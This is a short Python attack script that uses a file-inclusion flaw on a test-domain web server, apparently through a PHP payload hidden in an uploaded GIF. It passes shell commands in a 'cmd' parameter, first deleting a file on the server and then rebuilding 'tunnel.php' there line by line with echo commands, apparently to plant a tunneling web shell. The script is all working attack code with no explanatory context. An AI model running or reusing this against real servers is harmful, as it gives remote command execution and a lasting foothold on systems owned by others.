import requests
url="http://frontend.test.com/Functionality"
proxies={"http":""}
params={"page":"./uploads/Untitled.gif","cmd":"rm tunnel.php"}
r=requests.get(url,params=params,proxies=proxies)
f=open("tunnel.php","r")
lines=f.read().split("\n")
for line in lines:
	s="echo '"+line+"'>>tunnel.php"
 	params={"page":"./uploads/Untitled.gif","cmd":s}
 	r=requests.get(url,params=params,proxies=proxies)
